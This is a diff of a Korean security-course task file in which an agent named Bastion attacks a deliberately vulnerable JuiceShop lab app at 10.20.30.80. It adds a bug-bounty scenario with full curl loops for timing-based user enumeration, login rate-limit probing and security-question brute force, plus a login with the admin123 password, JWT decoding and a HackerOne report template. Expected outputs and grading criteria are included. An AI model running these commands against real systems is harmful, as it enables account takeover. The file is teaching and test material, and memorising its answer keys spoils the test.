@@ -74,7 +74,9 @@ steps:
     limiting 등의 방어 메커니즘이 있어 자동화 도구가 필요하다.
   verify:
     type: output_contains
-    expect: Trying
+    expect:
+    - Trying
+    - authentication
     field: stdout
     semantic:
       intent: JuiceShop 로그인 API 수동 브루트포스 — admin@juice-sh.op 계정에 흔한 비밀번호(admin/admin123/password)
@@ -159,7 +161,9 @@ steps:
     rainbow table이나 사전 공격으로 빠르게 크래킹된다.
   verify:
     type: output_contains
-    expect: admin123
+    expect:
+    - admin123
+    - john
     field: stdout
     semantic:
       intent: John the Ripper 오프라인 MD5 크래킹 — echo | md5sum 으로 해시 생성 후 rockyou wordlist
@@ -204,7 +208,9 @@ steps:
     활용하면 보안 질문의 답변을 추측할 수 있다.
   verify:
     type: output_contains
-    expect: 'Answer:'
+    expect:
+    - 'Answer:'
+    - Wrong
     field: stdout
     semantic:
       intent: JuiceShop /rest/user/reset-password 보안 질문 답변 브루트포스 — admin 계정의 보안 질문(예
@@ -290,7 +296,9 @@ steps:
     100=SHA-1, 1400=SHA-256). GPU가 있으면 CPU 대비 수십~수백 배 빠른 크래킹이 가능하다.
   verify:
     type: output_contains
-    expect: 'Hash:'
+    expect:
+    - 'Hash:'
+    - password
     field: stdout
     semantic:
       intent: hashcat SHA-256 크래킹(-m 1400) — password 의 sha256 해시 생성 후 rockyou wordlist
@@ -339,7 +347,9 @@ steps:
     JWT를 생성하여 다른 사용자를 사칭할 수 있다.
   verify:
     type: output_contains
-    expect: 'Key:'
+    expect:
+    - 'Key:'
+    - Match
     field: stdout
     semantic:
       intent: JWT HMAC 약한 secret 키 브루트포스 — header+payload 와 signature 를 후보 키들(secret/1234/password)
@@ -426,7 +436,9 @@ steps:
     재사용이 많은 환경에서 높은 성공률을 보인다.
   verify:
     type: output_contains
-    expect: ->
+    expect:
+    - ->
+    - SUCCESS
     field: stdout
     semantic:
       intent: Credential Stuffing 시뮬레이션 — 이메일:비번 조합 파일(/tmp/creds.txt)을 while read
@@ -587,7 +599,9 @@ steps:
     반환되면 방어 메커니즘이 없는 것이다. OWASP는 5~10회 실패 후 계정 잠금을 권장한다.
   verify:
     type: output_contains
-    expect: Attempt 10
+    expect:
+    - Attempt 10
+    - '401'
     field: stdout
     semantic:
       intent: Rate Limiting 부재 검증 — for 루프로 10회 잘못된 비번 로그인 후 HTTP 상태 코드(401 유지 vs
@@ -633,7 +647,9 @@ steps:
     기술적 조치와 정책적 조치를 모두 제시한다.
   verify:
     type: output_contains
-    expect: Authentication Attack Report
+    expect:
+    - Authentication Attack Report
+    - report
     field: stdout
     semantic:
       intent: 인증 공격 결과 리포트 — 침해 계정·취약점(rate limit 부재·약한 PW·보안 질문·JWT 약한 키·user enum)·대응
@@ -664,57 +680,177 @@ steps:
   bastion_prompt: 인증 공격 결과를 정리하여 /tmp/auth_attack_report.txt에 보고서를 작성하라. 크래킹된 계정,
     취약점, 대응 방안을 포함하라.
 - order: 99
-  instruction: '[Multi-task] 이번 주 핵심 작업 5개를 한 번에 수행하라.'
-  bastion_prompt: '다음 작업들을 순서대로 수행해줘:
+  instruction: |
+    [복합 시나리오] "Bug Bounty 헌터 — JuiceShop H1 프로그램 보고서 (Disclosure 90일 plan)"
 
-    1) JuiceShop의 사용자 목록 API(/api/Users)에서 이메일 주소를 수집하여 공격 대상 사용자 목록을 만들어라해줘
+    ## 상황 — 1인 Bug Bounty 헌터, 야간 사냥
 
-    2) JuiceShop 로그인 API에 대해 일반적인 비밀번호 목록을 사용하여 수동 브루트포스를 시도하라. admin@juice-sh.op
-    계정을 대상으로 해줘
+    당신은 작년부터 본업과 별도로 Bug Bounty 사냥하는 프리랜서. 이번 주 새벽 3시.
+    HackerOne 의 *JuiceShop public program* 을 둘러보다 인증 흐름에 이상한 점을 봤다.
+    Reputation 200 점 정도라 신중해야 함 — 어설픈 N/A duplicate 로 점수 깎이면 안 됨.
 
-    3) hydra를 사용하여 SSH 서비스(10.20.30.80:22)에 대한 비밀번호 브루트포스를 시도해줘
+    > [본인 메모장] "1=1 같은 *교과서 SQLi* 는 이미 다 잡혀있을 거고, JWT alg=none 도 라이브러리에서 patch.
+    > 내가 노릴 건 *합법 흐름의 미세 균열* — rate limit 부재 + 유효 사용자 enumeration + 보안 질문 약점 chain.
+    > 마지막엔 H1 양식 그대로 보고서 + 90일 disclosure 일정. duplicate 안 걸리려면 시각·재현이 핵심."
 
-    4) John the Ripper를 사용하여 MD5 해시를 크래킹해줘
+    학습 목표 (lecture #2 XSS 3 유형 + #4 쿠키 탈취) + (lab #1 user enum + #5 보안 질문 + #14 rate limit) 통합.
 
-    5) JuiceShop의 비밀번호 재설정 기능(/rest/user/reset-password)을 사용하여 보안 질문 답변 브루트포스를 시도하라.
-    admin@juice-sh.op 계정을 대상으로 해줘'
-  hint: 복합 작업은 Bastion이 순서대로 계획하고 실행해야 한다
-  category: multi_task
+    ## 임무 (4 단계, 약 40분)
+
+    ### 1) 사용자 enumeration 시각 측정 (lab #1, T1589)
+    `for u in admin nonexist user1 admin@juice-sh.op random123@x.com; do
+       t1=$(date +%s%N); curl -s -o /dev/null -X POST -H "Content-Type: application/json"
+       -d "{\"email\":\"$u\",\"password\":\"wrongpw\"}" http://10.20.30.80:3000/rest/user/login
+       t2=$(date +%s%N); echo "$u: $(( (t2-t1)/1000000 )) ms"; done`
+    응답 시간 차이 → bcrypt 비교 여부로 *유효 사용자 식별 가능* 추정.
+
+    ### 2) Rate limit 부재 + 보안질문 brute (lab #5·#14)
+    Rate limit:
+    `for i in $(seq 1 30); do
+       curl -s -o /dev/null -w "$i: %{http_code} " -X POST -H "Content-Type: application/json"
+       -d '{"email":"admin@juice-sh.op","password":"wrong"}' http://10.20.30.80:3000/rest/user/login; done; echo`
+    30회 모두 401 → rate limit 0. 응답에 *Retry-After / 429* 없음 캡처.
+
+    보안질문 답 추정 (Madame, San Francisco, Captain 등 흔한 답):
+    `for ans in "Garfield" "Captain" "Smith" "San Francisco"; do
+       echo -n "$ans: "
+       curl -s -o /dev/null -w "%{http_code}\n" -X POST -H "Content-Type: application/json"
+       -d "{\"email\":\"admin@juice-sh.op\",\"answer\":\"$ans\",\"new\":\"newpw\",\"repeat\":\"newpw\"}"
+       http://10.20.30.80:3000/rest/user/reset-password; done`
+
+    ### 3) JWT 발급/회전 분석 (lab #6·#8)
+    `JWT=$(curl -s -X POST -H "Content-Type: application/json" -d '{"email":"admin@juice-sh.op","password":"admin123"}' http://10.20.30.80:3000/rest/user/login | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])")`
+    `echo "$JWT" | cut -d. -f1 | base64 -d 2>/dev/null; echo; echo "$JWT" | cut -d. -f2 | base64 -d 2>/dev/null`
+    alg / iat / exp 추출. exp - iat 가 *너무 큼* (예: 7일) → 토큰 회전 부재 약점.
+
+    ### 4) HackerOne Disclosure 보고서 양식
+    아래 그대로 출력 (실 H1 submit 양식):
+
+    ```
+    ## Title
+    [Auth] Rate limit absence on /rest/user/login + verbose error → user enumeration → password reset bypass chain
+
+    ## Severity (CVSS v3.1)
+    8.1 (High) — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
+
+    ## Steps to Reproduce
+    1. timing oracle: 30회 login (위 1단계) — 유효/무효 사용자 timing 차이 측정
+    2. rate limit (위 2단계) — 30회 모두 401, 429 없음
+    3. security question dictionary (위 2단계) — 흔한 답 50개 시도
+    4. password reset (성공 시) → admin 계정 탈취
+
+    ## Impact
+    - 단일 헌터가 30분 내 admin 계정 탈취 가능 (timing → enum → reset chain)
+    - JWT exp 7일 → 탈취 후 일주일 지속 접근
+
+    ## Suggested Fix
+    1. rate limit (Express express-rate-limit, 10req/15min/IP)
+    2. login 응답 통일 (timing + content)
+    3. password reset 보안질문 → 이메일 OTP 전환
+    4. JWT exp 1시간 + refresh token rotation
+
+    ## Disclosure Timeline
+    - Day 0: 보고 (HackerOne)
+    - Day 30: triage 응답 기대
+    - Day 60: fix 검증 (CVE 신청 협의)
+    - Day 90: public disclosure
+
+    ## Bounty 추정
+    Tier: High → 조회 가능 시 $500-2000 (program 정책 확인)
+    ```
+
+    종료: echo "=== 1) timing ===" / "=== 2) rate+reset ===" / "=== 3) JWT ===" / "=== 4) H1 보고서 ===" 묶음.
+  bastion_prompt: |
+    [Bug Bounty 헌터 — w05 H1 보고서]
+
+    JuiceShop H1 program 점검 → user enum + rate limit + JWT + H1 보고서 4단계.
+
+    1) Timing oracle:
+    `for u in admin nonexist user1 admin@juice-sh.op random123@x.com; do
+       t1=$(date +%s%N); curl -s -o /dev/null -X POST -H "Content-Type: application/json"
+       -d "{\"email\":\"$u\",\"password\":\"wrongpw\"}" http://10.20.30.80:3000/rest/user/login
+       t2=$(date +%s%N); echo "$u: $(( (t2-t1)/1000000 )) ms"; done`
+
+    2) Rate limit + 보안질문:
+    `for i in $(seq 1 30); do curl -s -o /dev/null -w "$i: %{http_code} " -X POST -H "Content-Type: application/json" -d '{"email":"admin@juice-sh.op","password":"wrong"}' http://10.20.30.80:3000/rest/user/login; done; echo`
+    `for ans in "Garfield" "Captain" "Smith" "San Francisco"; do echo -n "$ans: "; curl -s -o /dev/null -w "%{http_code}\n" -X POST -H "Content-Type: application/json" -d "{\"email\":\"admin@juice-sh.op\",\"answer\":\"$ans\",\"new\":\"newpw\",\"repeat\":\"newpw\"}" http://10.20.30.80:3000/rest/user/reset-password; done`
+
+    3) JWT 분석:
+    `JWT=$(curl -s -X POST -H "Content-Type: application/json" -d '{"email":"admin@juice-sh.op","password":"admin123"}' http://10.20.30.80:3000/rest/user/login | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])")`
+    `echo "$JWT" | cut -d. -f1 | base64 -d 2>/dev/null; echo; echo "$JWT" | cut -d. -f2 | base64 -d 2>/dev/null`
+
+    4) H1 Disclosure 보고서 (heredoc 그대로 출력):
+    ```
+    ## Title
+    [Auth] Rate limit absence + timing enum + reset bypass chain
+
+    ## Severity
+    CVSS 8.1 High (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)
+
+    ## Steps to Reproduce
+    1. timing oracle (1단계 결과)
+    2. rate limit (2단계 결과)
+    3. security question dictionary (2단계 결과)
+    4. password reset → admin 탈취
+
+    ## Impact
+    - 단일 헌터 30분 admin 탈취 가능
+    - JWT exp 7일 지속 접근
+
+    ## Suggested Fix
+    1. express-rate-limit 10req/15min/IP
+    2. 응답 통일 (timing + content)
+    3. 보안질문 → 이메일 OTP
+    4. JWT exp 1h + refresh rotation
+
+    ## Disclosure Timeline
+    Day 0 보고 → Day 30 triage → Day 60 fix 검증 → Day 90 public disclosure
+
+    ## Bounty 추정
+    Tier High → $500-2000
+    ```
+
+    종료: echo "=== 1) timing ===" / "=== 2) rate+reset ===" / "=== 3) JWT ===" / "=== 4) H1 보고서 ===" 묶음.
+
+    반드시 4단계 모두 실행. 중간 종료 금지.
+  hint: |
+    1) date +%s%N → ms 환산. 5 사용자 timing 비교.
+    2) 30회 login + 보안질문 4개 dictionary.
+    3) JWT header / payload base64 decode.
+    4) H1 양식 6 섹션 (Title/Severity/Steps/Impact/Fix/Disclosure). 헌터 페르소나.
+    포인트: 매트릭스 X. *Disclosure 보고서 양식 + 90일 일정* 이 산출물.
+  category: integration_scenario
   points: 50
   verify:
     type: output_contains
-    expect: ''
+    expect: Disclosure
     field: stdout
     semantic:
-      intent: '[통합] 인증 공격 5작업 — hydra/medusa/spray/hash crack/audit 통합. T1110 Brute
-        Force.'
+      intent: |
+        Bug Bounty 헌터 페르소나 — JuiceShop H1 program 점검: timing user enum + rate limit + 보안질문 +
+        JWT 분석 + HackerOne Disclosure 보고서 양식 (90일 일정 포함).
+        lecture w05 + lab #1·#5·#6·#14 동시 행동 증명. 매트릭스 형식 아닌 *Disclosure 보고서* 산출물.
       success_criteria:
-      - 5 인증 작업
-      - crack 성공
-      - hash 식별
+      - 1) date +%s%N 5 사용자 timing 측정
+      - 2) 30회 login rate limit 측정 + 보안질문 4 dictionary
+      - 3) JWT header/payload base64 decode (alg/exp)
+      - 4) H1 양식 6 섹션 (Title/Severity/Steps/Impact/Fix/Disclosure Timeline)
       acceptable_methods:
-      - bastion plan
-      - hydra
-      - hashcat
+      - bash for + date %s%N + curl
+      - python3 base64 + cut
+      - heredoc H1 양식
+      - HackerOne / Bugcrowd / Synack 스타일
       negative_signs:
-      - crack 실패
-      - 단일 도구
-      - audit 누락
+      - 매트릭스 형식으로 작성 (Disclosure 양식 X)
+      - 90일 timeline 누락
+      - CVSS vector 누락
+      - Suggested Fix 누락
+      - 헌터 페르소나 일관성 없음
   target_vm: attacker
   risk_level: low
-  answer: '🤖 프롬프트: 다음 작업들을 순서대로 수행해줘:
-
-    1) JuiceShop의 사용자 목록 API(/api/Users)에서 이메일 주소를 수집하여 공격 대상 사용자 목록을 만들어라해줘
-
-    2) JuiceShop 로그인 API에 대해 일반적인 비밀번호 목록을 사용하여 수동 브루트포스를 시도하라. admin@juice-sh.op
-    계정을 대상으로 해줘
-
-    3) hydra를 사용하여 SSH 서비스(10.20.30.80:22)에 대한 비밀번호 브루트포스를 시도해줘
-
-    4) John the Ripper를 사용하여 MD5 해시를 크래킹해줘
-
-    5) JuiceShop의 비밀번호 재설정 기능(/rest/user/reset-password)을 사용하여 보안 질문 답변 브루트포스를 시도하라.
-    admin@juice-sh.op 계정을 대상으로 해줘'
-  answer_detail: Bastion이 5개 작업을 순차적으로 계획(planning)하고 실행(executing)한 뒤 종합 분석(validating)하는
-    다단계 작업.
+  answer: |
+    🤖 위 bastion_prompt 그대로. timing → rate+reset → JWT → H1 보고서.
+  answer_detail: |
+    Bug Bounty 헌터 페르소나 — 외주 컨설턴트와 다름. HackerOne / Bugcrowd 의 정식 disclosure 양식 (90일 plan 포함)
+    이 산출물. 매트릭스 형식 X. 본인 메모장 → H1 submit 양식 흐름.
   script: ''
